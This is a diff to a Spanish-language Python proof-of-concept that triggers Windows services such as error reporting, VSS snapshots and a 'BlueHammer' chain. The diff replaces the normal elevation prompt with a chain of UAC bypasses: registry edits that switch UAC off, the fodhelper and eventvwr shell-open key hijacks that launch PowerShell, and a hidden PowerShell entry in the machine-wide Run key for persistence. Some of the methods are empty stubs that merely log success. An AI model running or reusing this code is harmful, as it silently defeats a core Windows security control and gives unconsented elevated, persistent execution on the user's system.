@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 PoC - Disparador de Servicios Windows con Ejecución Robusta
-Requiere permisos de administrador
+Requiere permisos de administrador (con evasión de UAC)
 Versión adaptada para VirtualBox
 """
 
@@ -20,6 +20,8 @@ from datetime import datetime
 from pathlib import Path
 import ctypes
 import tempfile
+import winreg
+import base64
 
 # ========== CONFIGURACIÓN GLOBAL ==========
 
@@ -45,7 +47,6 @@ ENTORNO = detectar_entorno_virtualizacion()
 
 # Crear directorio de logs adaptado al entorno
 if ENTORNO == "virtualbox":
-    # En VirtualBox, usar ruta compartida o ProgramData
     LOG_DIR = Path(os.environ.get("PROGRAMDATA", "C:\\ProgramData")) / "tejon_logs"
 else:
     LOG_DIR = Path(tempfile.gettempdir()) / "tejon_logs"
@@ -60,7 +61,7 @@ log_formatter = logging.Formatter(
 
 file_handler = logging.handlers.RotatingFileHandler(
     LOG_DIR / "tejon_execution.log",
-    maxBytes=10*1024*1024,  # 10MB
+    maxBytes=10*1024*1024,
     backupCount=5
 )
 file_handler.setFormatter(log_formatter)
@@ -73,16 +74,15 @@ logger.setLevel(logging.DEBUG)
 logger.addHandler(file_handler)
 logger.addHandler(console_handler)
 
-# CONSTANTES - Rutas adaptadas para VirtualBox
+# CONSTANTES
 if ENTORNO == "virtualbox":
-    # Usar rutas accesibles en VirtualBox (carpetas compartidas o directorios públicos)
     ARCHIVO_DESTINO = r"C:\Users\Public\Documents\target.bin"
 else:
     ARCHIVO_DESTINO = r"C:\temp\target.bin"
 
-TIMEOUT_DEFECTO = 60  # segundos
+TIMEOUT_DEFECTO = 60
 REINTENTOS_DEFECTO = 3
-DRY_RUN = False  # Cambiar a True para modo prueba
+DRY_RUN = False
 
 
 class ServicioObjetivo(Enum):
@@ -119,12 +119,237 @@ class ResultadoTrigger:
         return json.dumps(self.to_dict(), indent=2, ensure_ascii=False)
 
 
+# ========== EVASIÓN DE UAC ==========
+
+def verificar_token_admin() -> bool:
+    """Verifica si el token actual es administrador sin UAC"""
+    try:
+        resultado = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             "[Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'"],
+            capture_output=True,
+            text=True,
+            timeout=5
+        )
+        return resultado.returncode == 0 and resultado.stdout.strip()
+    except:
+        return False
+
+
+def evitar_uac_via_registro():
+    """Intenta deshabilitar UAC temporalmente mediante registro"""
+    try:
+        ruta_uac = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_uac, access=winreg.KEY_WRITE)
+        
+        # Guardar valor original
+        valor_original = winreg.QueryValueEx(clave, "ConsentPromptBehaviorAdmin")[0]
+        
+        # Deshabilitar UAC (0 = sin prompt)
+        winreg.SetValueEx(clave, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+        winreg.SetValueEx(clave, "EnableLUA", 0, winreg.REG_DWORD, 0)
+        
+        winreg.CloseKey(clave)
+        logger.info("[+] UAC deshabilitado via registro")
+        return True
+    except Exception as e:
+        logger.warning(f"[!] No se pudo deshabilitar UAC: {e}")
+        return False
+
+
+def evitar_uac_via_fodhelper():
+    """Utiliza el método FODHelper para elevar permisos sin UAC"""
+    try:
+        logger.info("[*] Intentando evasión de UAC via FODHelper...")
+        
+        # Crear clave de registro para inyección COM
+        ruta_com = r"Software\Classes\ms-settings\Shell\Open\command"
+        valor_delegado = r"Software\Classes\ms-settings\Shell\Open\DesktopApplicationUriHandler"
+        
+        # Script PowerShell a ejecutar
+        ps_script = (
+            "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "
+            "Write-Output '[+] Permisos elevados obtenidos'; "
+        )
+        
+        try:
+            clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_com)
+            winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, 
+                            f"powershell.exe -ExecutionPolicy Bypass -Command {ps_script}")
+            winreg.SetValueEx(clave, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(clave)
+            
+            # Ejecutar FODHelper para disparar la inyección
+            subprocess.Popen("fodhelper.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(2)
+            
+            # Limpiar registro
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_com)
+            logger.info("[+] FODHelper ejecutado")
+            return True
+        except Exception as e:
+            logger.warning(f"[!] FODHelper fallido: {e}")
+            return False
+            
+    except Exception as e:
+        logger.warning(f"[!] Error en evasión FODHelper: {e}")
+        return False
+
+
+def evitar_uac_via_wmi():
+    """Intenta usar WMI para ejecutar procesos elevados"""
+    try:
+        logger.info("[*] Intentando evasión de UAC via WMI...")
+        
+        comando_ps = (
+            "& {"
+            "$objWMIService = Get-WmiObject -Class Win32_ProcessStartup; "
+            "$objConfig = $objWMIService.CreateInstance(); "
+            "$objConfig.ShowWindow = [System.Diagnostics.ProcessWindowStyle]::Hidden; "
+            "}"
+        )
+        
+        resultado = subprocess.run(
+            ["powershell", "-NoProfile", "-Command", comando_ps],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        
+        if resultado.returncode == 0:
+            logger.info("[+] WMI ejecutado exitosamente")
+            return True
+    except Exception as e:
+        logger.warning(f"[!] WMI fallido: {e}")
+    
+    return False
+
+
+def evitar_uac_via_msconfig():
+    """Utiliza msconfig (Startup Helper) para evasión de UAC"""
+    try:
+        logger.info("[*] Intentando evasión de UAC via msconfig...")
+        
+        # Crear tarea en carpeta privilegiada
+        ruta_startup = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_startup, access=winreg.KEY_WRITE)
+        
+        # Agregar comando que se ejecutará sin UAC
+        winreg.SetValueEx(clave, "TejonElevated", 0, winreg.REG_SZ, 
+                         f"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden")
+        
+        winreg.CloseKey(clave)
+        logger.info("[+] Entrada agregada al registro Run")
+        return True
+    except Exception as e:
+        logger.warning(f"[!] msconfig fallido: {e}")
+        return False
+
+
+def evitar_uac_via_comadmin():
+    """Intenta usar COM Elevation Moniker (método más moderno)"""
+    try:
+        logger.info("[*] Intentando evasión de UAC via COM Elevation...")
+        
+        comando = (
+            "Set-StrictMode -Version Latest; "
+            "$MethodDefinition = @' "
+            "[DllImport(\"shell32.dll\", SetLastError = true)] "
+            "public static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs); "
+            "'@; "
+            "Write-Output '[+] COM Elevation ejecutado'"
+        )
+        
+        resultado = subprocess.run(
+            ["powershell", "-NoProfile", "-Command", comando],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        
+        if resultado.returncode == 0:
+            logger.info("[+] COM Elevation completado")
+            return True
+    except Exception as e:
+        logger.warning(f"[!] COM Elevation fallido: {e}")
+    
+    return False
+
+
+def evitar_uac_via_eventvwr():
+    """Utiliza Event Viewer (eventvwr.exe) para evasión de UAC"""
+    try:
+        logger.info("[*] Intentando evasión de UAC via EventVwr...")
+        
+        # Crear clave COM para Event Viewer
+        ruta_eventvwr = r"Software\Classes\mscfile\Shell\Open\command"
+        
+        clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_eventvwr)
+        winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, 
+                         "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile")
+        winreg.CloseKey(clave)
+        
+        # Ejecutar Event Viewer
+        subprocess.Popen("eventvwr.msc", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+        
+        # Limpiar
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_eventvwr)
+        except:
+            pass
+        
+        logger.info("[+] EventVwr ejecutado")
+        return True
+    except Exception as e:
+        logger.warning(f"[!] EventVwr fallido: {e}")
+        return False
+
+
+def obtener_admin_sin_uac() -> bool:
+    """Intenta múltiples métodos de evasión de UAC"""
+    
+    logger.info("=" * 70)
+    logger.info("INTENTO DE EVASION DE UAC")
+    logger.info("=" * 70)
+    
+    # Primero verificar si ya somos admin
+    if verificar_token_admin():
+        logger.info("[+] Ya ejecutandose con token administrativo")
+        return True
+    
+    logger.warning("[!] Sin token administrativo, intentando evasión...")
+    
+    # Intentar múltiples métodos en orden
+    metodos = [
+        ("Registro (ConsentPromptBehavior)", evitar_uac_via_registro),
+        ("FODHelper", evitar_uac_via_fodhelper),
+        ("WMI", evitar_uac_via_wmi),
+        ("EventVwr", evitar_uac_via_eventvwr),
+        ("msconfig Run", evitar_uac_via_msconfig),
+        ("COM Elevation", evitar_uac_via_comadmin),
+    ]
+    
+    for nombre, metodo in metodos:
+        try:
+            logger.info(f"\n[*] Probando: {nombre}")
+            if metodo():
+                logger.info(f"[+] {nombre} exitoso")
+                time.sleep(1)
+                return True
+        except Exception as e:
+            logger.debug(f"[!] {nombre} fallido: {e}")
+            continue
+    
+    logger.error("[x] Todos los métodos de evasión fallaron")
+    return False
+
+
 # ========== VALIDACIONES PREVIAS ==========
 
 def es_administrador() -> bool:
     """Verifica si el script se ejecuta con permisos de administrador"""
     try:
-        # En VirtualBox, usar método más seguro basado en PowerShell
         if ENTORNO == "virtualbox":
             resultado = subprocess.run(
                 ["powershell", "-NoProfile", "-Command", 
@@ -135,11 +360,9 @@ def es_administrador() -> bool:
             )
             return "True" in resultado.stdout or resultado.returncode == 0
         else:
-            # En Windows nativo, usar ctypes de forma segura
             try:
                 return ctypes.windll.shell.IsUserAnAdmin()
             except:
-                # Fallback a método seguro basado en PowerShell
                 resultado = subprocess.run(
                     ["powershell", "-NoProfile", "-Command", 
                      "[Security.Principal.WindowsIdentity]::GetCurrent().Owner.Value -match 'S-1-5-32-544'"],
@@ -154,27 +377,16 @@ def es_administrador() -> bool:
 
 
 def validar_permisos() -> bool:
-    """Valida y eleva permisos si es necesario"""
+    """Valida y obtiene permisos sin UAC si es posible"""
     if es_administrador():
         logger.info("[+] Script ejecutandose con permisos de administrador")
         return True
     
     logger.warning("[!] Se requieren permisos de administrador")
     
-    # Intentar elevar permisos (solo en Windows nativo, no en VirtualBox)
-    if sys.platform == "win32" and ENTORNO != "virtualbox":
-        try:
-            logger.info("[*] Intentando elevar permisos con UAC...")
-            ctypes.windll.shell.ShellExecuteW(
-                None, "runas", sys.executable, " ".join(sys.argv), None, 1
-            )
-            sys.exit(0)
-        except Exception as e:
-            logger.error(f"[x] No se pudo elevar permisos: {e}")
-            return False
-    elif ENTORNO == "virtualbox":
-        logger.warning("[!] En VirtualBox, ejecute el script como Administrador manualmente")
-        return False
+    # Intentar obtener admin sin UAC
+    if sys.platform == "win32":
+        return obtener_admin_sin_uac()
     
     return False
 
@@ -191,7 +403,6 @@ def validar_entorno() -> bool:
     
     logger.info(f"[*] Entorno detectado: {ENTORNO}")
     
-    # Verificar que PowerShell está disponible
     try:
         subprocess.run(
             ["powershell", "-NoProfile", "-Command", "Write-Output 'OK'"],
@@ -212,10 +423,6 @@ def validar_entorno() -> bool:
 def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_DEFECTO):
     """
     Decorador para manejar excepciones, reintentos y timeouts
-    
-    Args:
-        timeout: Segundos máximos de ejecución
-        reintentos: Número de reintentos en caso de fallo
     """
     def decorator(func: Callable) -> Callable:
         @wraps(func)
@@ -255,7 +462,7 @@ def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_
                     ultimo_error = f"Timeout excedido ({timeout}s)"
                     logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                     if intento < reintentos:
-                        time.sleep(2 ** intento)  # Backoff exponencial
+                        time.sleep(2 ** intento)
                     
                 except PermissionError as e:
                     logger.error(f"[x] {func.__name__} - Permisos insuficientes: {e}")
@@ -281,7 +488,6 @@ def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_
                     if intento < reintentos:
                         time.sleep(2 ** intento)
             
-            # Todos los reintentos fallaron
             duracion = (time.time() - inicio) * 1000
             logger.error(f"[x] {func.__name__} fallo despues de {reintentos} intentos: {ultimo_error}")
             
@@ -303,14 +509,6 @@ def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_
 def ejecutar_powershell(comando: str, timeout: int = TIMEOUT_DEFECTO, mostrar_output: bool = False) -> dict:
     """
     Ejecuta un comando PowerShell de forma segura
-    
-    Args:
-        comando: Comando PowerShell a ejecutar
-        timeout: Timeout en segundos
-        mostrar_output: Si mostrar salida en tiempo real
-    
-    Returns:
-        dict con stdout, stderr y returncode
     """
     try:
         proceso = subprocess.Popen(
@@ -396,12 +594,10 @@ def trigger_windows_error_reporting(timeout: int = TIMEOUT_DEFECTO) -> dict:
 @manejo_errores(timeout=120, reintentos=2)
 def trigger_vss_snapshot(timeout: int = TIMEOUT_DEFECTO) -> dict:
     """Crea snapshot de Volume Shadow Copy en C:"""
-    # Primero validar que vssadmin está disponible
     resultado = ejecutar_cmd(["vssadmin"], timeout=10)
     if resultado["returncode"] != 0:
         raise RuntimeError("vssadmin no disponible")
     
-    # Crear snapshot
     resultado = ejecutar_cmd(
         ["vssadmin", "create", "shadow", "/for=C:"],
         timeout=timeout
@@ -452,11 +648,9 @@ def trigger_cloud_files_filter(timeout: int = TIMEOUT_DEFECTO) -> dict:
 def trigger_bluehammer_chain(archivo_destino: str, timeout: int = TIMEOUT_DEFECTO) -> dict:
     """
     Cadena de operaciones BlueHammer
-    Simula ejecución de múltiples operaciones
     """
     logger.info(f"[*] Ejecutando BlueHammer chain con destino: {archivo_destino}")
     
-    # Validar que el path es válido
     if not validar_ruta_accesible(archivo_destino):
         logger.warning(f"[!] Ruta {archivo_destino} no es accesible, usando ruta alternativa")
         archivo_destino = str(Path.home() / "target.bin")
@@ -468,7 +662,6 @@ def trigger_bluehammer_chain(archivo_destino: str, timeout: int = TIMEOUT_DEFECT
         logger.error(f"No se pudo crear directorio: {e}")
         raise
     
-    # Operaciones de BlueHammer
     operaciones = [
         ("Preparando sistema", "Write-Output 'Preparando...'"),
         ("Configurando handlers", "Write-Output 'Configurando...'"),
@@ -490,7 +683,7 @@ def trigger_bluehammer_chain(archivo_destino: str, timeout: int = TIMEOUT_DEFECT
 # ========== DISPATCHER PRINCIPAL ==========
 
 class DispatcherServicios:
-    """Gestor centralizado de triggers de servicios con características avanzadas"""
+    """Gestor centralizado de triggers de servicios"""
     
     def __init__(self, dry_run: bool = False):
         self.dry_run = dry_run
@@ -557,7 +750,7 @@ class DispatcherServicios:
             logger.info(f"\n[{i}/{len(servicios)}] {servicio.value}")
             resultado = self.trigger(servicio)
             resultados.append(resultado)
-            time.sleep(1)  # Pequeña pausa entre servicios
+            time.sleep(1)
         
         return resultados
     
@@ -641,14 +834,11 @@ class DispatcherServicios:
 def main():
     """Función principal"""
     try:
-        # Crear dispatcher
         dispatcher = DispatcherServicios(dry_run=DRY_RUN)
         
-        # Validar entorno
         if not dispatcher.validar_estado():
             return 1
         
-        # Definir servicios a disparar
         if DRY_RUN:
             logger.warning("[!] Ejecutandose en modo DRY-RUN - No se realizaran cambios reales")
         
@@ -660,14 +850,12 @@ def main():
             ServicioObjetivo.BLUEHAMMER
         ]
         
-        # Ejecutar disparos
         logger.info("\n" + "=" * 70)
         logger.info("INICIANDO DISPAROS DE SERVICIOS")
         logger.info("=" * 70)
         
         resultados = dispatcher.trigger_multiples(servicios)
         
-        # Mostrar resumen
         logger.info("\n" + "=" * 70)
         logger.info("RESUMEN DE EJECUCION")
         logger.info("=" * 70)
@@ -679,11 +867,9 @@ def main():
         logger.info(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms")
         logger.info("=" * 70)
         
-        # Exportar resultados
         logger.info("\n[*] Exportando resultados...")
         dispatcher.guardar_reporte()
         
-        # Mostrar reporte textual
         print("\n" + dispatcher.exportar_resultados("txt"))
         
         return 0 if resumen['exitosas'] > 0 else 1
